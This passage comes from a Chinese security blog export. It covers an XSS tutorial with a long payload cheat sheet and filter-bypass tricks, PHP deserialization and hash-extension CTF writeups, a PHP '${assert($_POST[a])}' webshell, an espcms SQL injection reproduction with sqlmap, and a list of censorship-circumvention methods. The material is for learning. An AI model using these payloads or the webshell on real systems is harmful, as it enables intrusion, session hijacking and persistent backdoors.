&#160; &#160;由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。&#160; &#160; &#160; &#160;这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容 &#160; &#160; &#160; &#160;Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。&#160; &#160; &#160; &#160;在Session机制中，客户端和服务端也有被其他人利用的可能。&#160; &#160; &#160; &#160;Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面 &#160; &#160; &#160; &#160;这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。&#160; &#160; &#160; &#160;会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。 通过javascript控制DOM对象来发起一个GET请求，如： 123var img = document.creatElement(&quot;img&quot;);img.src = &quot;http://www.a.com/del.php?id=1&quot;;document.body.appendChild(img); 通过javascript自动构造隐藏表单并提交(POST) 通过XMLHttpRequest直接发送一个POST请求 &#160; &#160; &#160; &#160;我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。 钓鱼&#160; &#160; &#160; &#160;现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？ XSS重定向钓鱼&#160; &#160; &#160; &#160;即从www.a.com通过xss漏洞跳转到www.b.com的钓鱼页面上，整个过程变化明显，受害者易察觉。1http://www.a.com/index.php?search=&lt;script&gt;document.location.href=&quot;http://www.b.com/index.php&quot;&lt;/script&gt; HTML注入式钓鱼&#160; &#160; &#160; &#160;通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。 Iframe&#160; &#160; &#160; &#160;攻击者通过javascript来添加一个新的&lt;Iframe&gt;标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。 5) XSS漏洞的挖掘&#160; &#160; &#160; &#160;就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。 白盒审计&#160; &#160; &#160; &#160;通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。 分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤 黑盒审计&#160; &#160; &#160; &#160;这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。 手工检测&#160; &#160; &#160; &#160;首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如&quot;&lt;&gt;&amp;;/&#39;:等，如果连&lt;&gt;都未过滤/转义，那么该输入点很可能存在XSS漏洞。&#160; &#160; &#160; &#160;如果&lt;&gt;等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如&lt;input name=&quot;xx&quot; value=&lt;?=$query?&gt;&gt;这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为&lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&gt;。&#160; &#160; &#160; &#160;一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566常见标签&lt;img&gt;标签利用方式1&lt;img src=javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr=&quot;URL&quot; style=&apos;Xss:expression(alert(/xss));&apos;&lt;!--CSS标记xss--&gt;&lt;img STYLE=&quot;background-image:url(javascript:alert(&apos;XSS&apos;))&quot;&gt;XSS利用方式2&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;XSS利用方式3&lt;img src=1 onmouseover=alert(&apos;xss&apos;)&gt;&lt;a&gt;标签标准格式&lt;a href=&quot;https://www.baidu.com&quot;&gt;baidu&lt;/a&gt;XSS利用方式1&lt;a href=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;aa&lt;/a&gt;&lt;a href=javascript:eval(alert(&apos;xss&apos;))&gt;aa&lt;/a&gt;&lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;XSS利用方式2&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;a href=&quot;&quot; onclick=alert(&apos;xss&apos;)&gt;aa&lt;/a&gt;利用方式3&lt;a href=&quot;&quot; onclick=eval(alert(&apos;xss&apos;))&gt;aa&lt;/a&gt;利用方式4&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&apos;xss&apos;) y=2016&gt;aa&lt;/a&gt;input标签标准格式&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;利用方式1&lt;input value=&quot;&quot; onclick=alert(&apos;xss&apos;) type=&quot;text&quot;&gt;利用方式2&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&apos;xss&apos;) bad=&quot;&quot;&gt;利用方式4&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;form&gt;标签XSS利用方式1&lt;form action=javascript:alert(&apos;xss&apos;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&apos;xss&apos;)&gt;XSS利用方式2&lt;form method=post action=aa.asp? onmouseover=prompt(&apos;xss&apos;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&apos;xss&apos;)&gt;&lt;form action=1 onmouseover=alert(&apos;xss)&gt;XSS利用方式3&lt;!--原code--&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;iframe&gt;标签XSS利用方式1&lt;iframe src=javascript:alert(&apos;xss&apos;);height=5width=1000 /&gt;&lt;iframe&gt;XSS利用方式2&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&apos;xss&apos;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;!--原code--&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;XSS利用方式3&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&apos;xss&apos;) /&gt;&lt;iframe&gt;XSS利用方式3&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt;svg&lt;&gt;标签&lt;svg onload=alert(1)&gt;iframe&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt; ——引自wkend的文章《XSS小节》 工具检测&#160; &#160; &#160; &#160;关于XSS的自动检测软件有许多，如Burp的Scan模块，BruteXSS等，这里不做过多解释。 6) shellcode的绕过绕过XSS-Filter&#160; &#160; &#160; &#160;XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。 空格回车和Tab&#160; &#160; &#160; &#160;对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将;作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到;便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字javascript|alert的过滤：123&lt;img src=javascript:alert(/xss/)&gt; 对标签属性值进行转码&#160; &#160; &#160; &#160;HTML中属性值支持ASCII码形式，如1&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt; &#160; &#160; &#160; &#160;替换成1&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(&apos;xss&apos;);&quot;&gt; &#160; &#160; &#160; &#160;其中在ASCII表中116为t，58为:。&#160; &#160; &#160; &#160;也可以将&amp;#01,&amp;#02等插入javascript的头部，还可以将tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。 Fuzz标签未过滤事件名&#160; &#160; &#160; &#160;如&lt;img src=x onerror=alert(/xss/)&gt;其中的onerror即为IMG标签的一个事件，通常这样的事件都是以on开头，常见的有:123456789onResumeonReverseonSeekonSynchRestoredonURLFliponRepeatonPauseonstoponmouseover &#160; &#160; &#160; &#160;除此之外还有很多事件可以利用，这里不再一一列举。 使用Css绕过&#160; &#160; &#160; &#160;利用Css样式表可以执行javascript的特性，如&#160; &#160; &#160; &#160;Css直接执行javascript：1234&lt;div style=&quot;background-image:url(javascript:alert(&apos;xss&apos;))&quot;&gt;&lt;style&gt; body &#123;background-image:url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;&lt;/style&gt; &#160; &#160; &#160; &#160;css中使用expression执行javascript:12345&lt;div style=&quot;width: expression(alert(&apos;xss&apos;))&quot;&gt;&lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/))&quot;&gt;&lt;style&gt; body &#123;background-image:expression(&quot;alert(&apos;xss&apos;)&quot;);&#125;&lt;/style&gt; &#160; &#160; &#160; &#160;在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。&#160; &#160; &#160; &#160;除了上述两种，还可以利用@import直接执行javascript代码123&lt;style&gt; @import &apos;javascript:alert(&quot;xss&quot;)&apos;;&lt;/style&gt; &#160; &#160; &#160; &#160;在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。 扰乱规则 大小写变换; 利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则; 结合样式表注释字符/**/，通过css执行javascript 样式标签会过滤\和\0，可以构造如@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;绕过 Css关键字进行编码处理，如&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;其中65为字母e进行unicode编码后的数字部分 利用浏览器解析注释的问题 利用字符编码&#160; &#160; &#160; &#160;javascript支持许多的编码格式，如： unicode escapes 十六|十|八进制 如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力在IE下甚至支持JScript Encode加密后的代码 拆分法&#160; &#160; &#160; &#160;如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：《疯狂的跨站之行》剑心(非原链接) 7) XSS防御&#160; &#160; &#160; &#160;说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？ 输入&#160; &#160; &#160; &#160;严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。 输出&#160; &#160; &#160; &#160;减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。 其他&#160; &#160; &#160; &#160;设置HttpOnly，开启WAF。 写在最后&#160; &#160; &#160; &#160;感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注我的博客(www.0x002.com)。 参考资料书籍：《Web前端黑客技术揭秘》《XSS跨站脚本攻击剖析与防御》《白帽子讲Web安全》《黑客攻防技术宝典Web实战篇》第二版文章：XSS小结浅说 XSS 和 CSRFSession攻击手段(会话劫持/固定)及其安全防御措施 附录https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md 2017灰袍技能精华https://github.com/rajeshmajumdar/BruteXSS BruteXSShttps://github.com/beefproject/beef Beef神器https://github.com/1N3/XSSTracer 用于检查跨站点跟踪的小型python脚本https://github.com/0x584A/fuzzXssPHP 一个非常简单的反射XSS扫描仪支持GET/POSThttps://github.com/chuhades/xss_scan 反射xss扫描器https://github.com/BlackHole1/autoFindXssAndCsrf 浏览器的插件，它自动检查页面是否具有xss和漏洞https://github.com/shogunlab/shuriken xss命令行工具用于测试web应用程序中xss负载列表https://github.com/UltimateHackers/XSStrike 用于XSS、WAF检测和旁路的模糊和蛮力参数https://github.com/stamparm/DSXS 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化漏洞的简单学习]]></title>
    <url>%2F2018%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。 PHP序列化与反序列化谈到PHP序列化与反序列化那么必须涉及到两个函数serialize()与unserialize()前者是将一个对象进行序列化后者是其反过程 serialize()先来看看此函数的解释函数返回的是一串字符串，可以对如数组和对象进行序列化处理下面给出两个例子1234567&lt;?php //对数组进行序列化$a = array(&apos;a&apos; =&gt; &apos;Apple&apos; ,&apos;b&apos; =&gt; &apos;banana&apos; , &apos;c&apos; =&gt; &apos;Coconut&apos;);//序列化数组$s = serialize($a);echo $s;//输出结果：a:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;&#125;?&gt; 12345678910&lt;?phpclass name1 &#123; var $test1; var $test2;&#125;$test3 = new name1;$test3-&gt;test1 = &apos;hack &apos;;$test3-&gt;test2 = &apos;fun&apos;;echo serialize($test3); //输出结果：O:5:&quot;name1&quot;:2:&#123;s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;&#125; 对于序列化后得到的字符串解释如图 unserialize()将已序列化的字符串进行反序列，即恢复序列化前123456789&lt;?phpclass name1 &#123; var $test1; var $test2;&#125;$str = &apos;O:5:&quot;name1&quot;:2:&#123;s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;&#125;&apos;;$ser = unserialize($str);print_r($ser);?&gt; 反序列化漏洞看似安全的序列化其实存在漏洞，而且一旦能利用就一般危害不小，在代码审计中我们需要格外注意此类型漏洞。序列化漏洞常见的魔法函数 1234567construct():当一个类被创建时自动调用destruct():当一个类被销毁时自动调用invoke():当把一个类当作函数使用时自动调用tostring():当把一个类当作字符串使用时自动调用wakeup():当调用unserialize()函数时自动调用sleep():当调用serialize()函数时自动调用__call():当要调用的方法不存在或权限不足时自动调用 简单测试如下：1234567891011121314151617181920212223&lt;?phpclass chybeta&#123; var $test = &apos;123&apos;; function __wakeup()&#123; echo &quot;__wakeup&quot;; echo &quot;&lt;/br&gt;&quot;; &#125; function __construct()&#123; echo &quot;__construct&quot;; echo &quot;&lt;/br&gt;&quot;; &#125; function __destruct()&#123; echo &quot;__destruct&quot;; echo &quot;&lt;/br&gt;&quot;; &#125;&#125;$class2 = &apos;O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&apos;; print_r($class2);echo &quot;&lt;/br&gt;&quot;;$class2_unser = unserialize($class2);print_r($class2_unser);echo &quot;&lt;/br&gt;&quot;;?&gt; 由前可以看到，unserialize()后会导致wakeup() 或destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在wakeup() 或destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。(这里因为懒直接照搬了某大佬的原文） 绕过魔法函数魔法函数sleep() 和 wakeup()php文档中定义__wakeup():unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep()则相反，是用在序列化一个对象时被调用.正常情况下的反序列化来漏洞如下图：析构方法和__wakeup都能够执行如果我们把传入的序列化字符串的属性个数更改成大于1的任何数1O:7:&quot;hpdoger&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;u know&quot;;&#125; 得到的结果如图，__wakeup没有被执行，但是执行了析构函数 反序列化漏洞实战 南邮CTF123456789101112131415161718192021222324&lt;?phpclass just4fun &#123; //定义了一个类 var $enter; var $secret;&#125;if (isset($_GET[&apos;pass&apos;])) &#123; $pass = $_GET[&apos;pass&apos;]; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); //进行反序列化处理 if ($o) &#123; $o-&gt;secret = &quot;*&quot;; //这里不知道*代表的是啥 if ($o-&gt;secret === $o-&gt;enter) //要求$o中的两个属性值相同 echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&apos;t fool me&quot;; &#125; else echo &quot;are you trolling?&quot;;&#125;?&gt; 由于我们不知道*代表的是什么，故我们需要用指针来直接使两属性相等。123456789&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;$o = new just4fun;$o-&gt;enter = &amp;$o-&gt;secret; //这里的a=&amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于becho serialize($o);?&gt; 本地运行即可得到序列化字符串O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}然后将此作为pass参数GET发送即可获得flag]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>PHP代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF实验吧让我进去writeup]]></title>
    <url>%2F2018%2FCTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup%2F</url>
    <content type="text"><![CDATA[初探题目 两个表单，我们用burp抓包试试这时候我们发现Cookie值里有个很奇怪的值是source，这个单词有起源的意思，我们就可以猜测这个是判断权限的依据，让我们来修改其值为1，发送得到如下显示： 代码审计发现爆出了源代码，让我们来审计一下12345678910111213141516171819202122232425262728293031$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) &#123; if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123; if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123; echo &quot;Congratulations! You are a registered user.\n&quot;; die (&quot;The flag is &quot;. $flag); &#125; else &#123; die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;); &#125; &#125; else &#123; die (&quot;You are not an admin! LEAVE.&quot;); &#125;&#125;setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) &#123; setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE[&quot;source&quot;] != 0) &#123; echo &quot;&quot;; // This source code is outputted here &#125;&#125; 我们如果需要获得flag，需要满足一下条件：1.Cookie中getmein的值不能为空2.username必须为admin和password不能为admin3.Cookie中的getmein必须等于md5($secret.urldecode($username.$password))满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));发现下面有行代码是这样写的，将输出的md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))作为cookie输出，结合前面的数据包我们可以知道输出的值为571580b26c65f306376d4f64e53cb5c7 可是这串md5是由$secret+’adminadmin’转md5而得到的，如果我们在password输入admin将不满足前面所需的三个条件 死局转生我们知道常见的md5是16位的，而这里的md5正是16位，我们的$secret是十五位的,加上’adminadmin’就变成25位了，很明显这里的md5肯定会出现重复，所以我们可以哈希长度拓展攻击绕过这个死局这里附两个讲述具体原理的链接:http://www.freebuf.com/articles/web/69264.html https://www.cnblogs.com/p00mj/p/6288337.html 在Kali下用hashpump操作最好我们构造数据包，把生成的数据发送即可获得flag]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[个人总结的一些科学上网的方法]]></title>
    <url>%2F2018%2F%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[一、VPN大法:vpn大法可谓是最常见的招式，但目前随着天朝禁止的程度逐渐加大，许多VPN已经无法免费的使用，但是收费的VPN使用起来确实不错，主要是用来玩游戏。 目前免费的VPN：一小时VPN账号 Free VPN 免费24小时 二、SS大法： SS大法全称为ShadowSocks，也叫影梭大法，ShadowSocks 是由@clowwindy所开发的一个开源 Socks5 代理，主要是用来穿透防火墙的限制来达到科学上网的目的。 目前市面上免费的SS有很多，这里就列举两个：Let’s SS Free SS 三、SSR大法：SSR全称shadowsocks-R。SSR作者声称SS不够隐匿，容易被防火墙检测到，SSR在改进了混淆和协议，更难被防火墙检测到。简单地说，SSR是SS的改进版。使用方法与SS类似，这里不是在赘述。 四、V2大法：继vpn,ss,ssr之后又一个好用的科学上网工具，用法类似ss与ssr使用方法具体请百度。 五、镜像大法：镜像大法，顾名思义就是通过仿制一个被墙的网站，通过浏览这个镜像站来达到翻墙的作用（实际上并没有翻墙）。 当然镜像也不可能是把他整个网站都模仿下载。操作原理可简单认为：通过一个可以翻墙的服务器搭建一个镜像站，当你访问镜像站的时候，服务器会想被镜像站发送相同的数据包并返回到你的浏览器上。 目前可用的镜像站也有很多，在这里就给大家列举两个： 谷歌镜像导航 镜像站收集项目 六、Host大法：Host大法即修改本机Host，使域名直接被定向到其真实IP，穿透了GWF的拦截，达到翻墙的目的 最新穿墙Host： 最新Host 七、DNS大法：DNS大法即修改本机DNS来达到翻墙的目的，有些DNS是可以翻墙的，使用他的DNS就可以达到穿墙的目的。 穿墙的DNS有：DNS 八、小白翻墙终极大招之Tor大法：Tor大法，即通过Tor浏览器来达到翻墙的目的，此大法会经过三重代理来达到科学上网的目的，不过速度会比较慢一些，正常的网页浏览还可以做到，如果要是想用来看视频什么的就算了，此方法永久免费。虽然网上有一些什么误入暗网最后不得好死等此类新闻，但大多数都是危言耸听，暗网这种东西，只要你不去刻意的了解，一般人都不会接触到的。 附Tor官网下载： Tor下载]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>奇淫技巧</tag>
        <tag>Google</tag>
        <tag>翻墙大法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP中双引号引起的命令执行漏洞]]></title>
    <url>%2F2018%2FPHP%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%BC%95%E8%B5%B7%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前言在PHP语言中，单引号和双引号都可以表示一个字符串，但是对于双引号来说，可能会对引号内的内容进行二次解释，这就可能会出现安全问题。 正文举个简单例子123456&lt;?php$a = 1;$b = 2;echo &apos;$a$b&apos;;//输出结果为$a$becho &quot;$a$b&quot;;//输出结果为12?&gt; 可以看到这两个输出的结果并不相同。在双引号中倘若有${}出现，那么{}内的内容将被当做代码块来执行。可以看到成功执行了phpinfo() 试想一下，倘若在一个cms的后台，可以修改数据库的配置文件，且配置文件中的值用双引号包括，我们虽然也可以直接闭合代码达到getshell的后果，但是如果cms对传递的参数进行了addlashes()处理的话，我们就无法去闭合代码了，但这时我们可以传入${命令}就可以达到getshell的目的。 现在，让我们来修改一下代码，让我们不只能输出phpinfo1&lt;?php echo &quot;$&#123;@assert($_POST[a])&#125;&quot;;?&gt; //@是用来防止输出错误信息的 菜刀成功连接 总结本文简单记录了双引号可能会引发的代码执行的情况对于这种漏洞的防御，一定要明确单引号与双引号的区别所在，不要简单认为两者是互相可以替代的，在平时的代码书写中能只用单引号一定不要用双引号，毕竟单引号的解释时间也比双引号少得多，代码运行相对更快。]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读书笔记之CMS漏洞复现集合]]></title>
    <url>%2F2018%2F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bespcms%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言最近在看法师的代码审计企业级代码安全架构一书，打算对书中所列出的cms漏洞进行复现，无技术含量。 正文准备工作 1.phpstudy环境整合包2.各种cms安装包3.《代码审计企业级代码安全架构》4.Seay源代码审计系统 复现一之espcms注入漏洞 漏洞文件位置：espcms\adminsoft\control\citylist.php可以看到这里有一个sql请求，并且请求中包含着变量$parentid。并且$parentid的赋值句子为1$parentid = $this-&gt;fun-&gt;accept(&apos;parentid&apos;, &apos;R&apos;) 这里引用对象进行赋值我们查找accept这个自定义函数，看看是否有可能会有sql注入。可以看出这个函数是_用来通过$_POST、$_GET、$_COOKIE 三种方法来接收数据并保存为数组变量$var最后通过一个daddslashes()函数对数据进行单引号等字符的过滤但是我们前面所提到的sql语句中并不需要我们去闭合单引号，那么这句造成了一个sql注入漏洞我们来找一下那些文件实例化了这个类这个类名叫important，我们直接进行全局搜索可以看到在adminsoft\index.php文件实例化了该类Tips:1234$control = new important();//实例化important类$action = &apos;on&apos; . $action;//&apos;变量赋值&apos;if (method_exists($control, $action)) &#123;//检测方法是否此名字 $control-&gt;$action();//如果存在则使用important类中的方法 成功注入用sqlmap测试一下因为该漏洞需要登录，即需要cookie验证，我们用burpsuite抓下数据包，并保存到sqlmap目录下的1.txt里，然后再用sqlmap，输入命令1python2 sqlmap.py -r 1.txt 总结此漏洞涉及到php编程中的面向对象问题、addslashes()函数等知识点，比较基础]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[变量覆盖漏洞学习及在webshell中的运用]]></title>
    <url>%2F2018%2F%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8%2F</url>
    <content type="text"><![CDATA[一、发生条件：函数使用不当（$$、extract()、parse_str()、import_request_variables()等）开启全局变量 二、基础了解：1.$$定义$$代表可变变量，就是说，一个变量的变量名可以动态的设置和使用。举个简单例子： 变量a被定义成了字符串hello 而变量$a被定于成了字符串world!但同时$a本身也是个变量$$a就可以代表两个含义$($a)和$(hello) 两个变量此时输出的结果如图： 2.extract()定义extract()可以从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值语法结构：extract(array,extract_rules,prefix)i.array为必选参数（此参数必须为数组型数据）ii.extract_rules为可选参数，可选的值有：● EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。● EXTR_SKIP - 如果有冲突，不覆盖已有的变量。● EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。● EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。● EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。● EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。● EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。● EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。iii.prefix为可选参数（此参数暂不解释）举个例子： 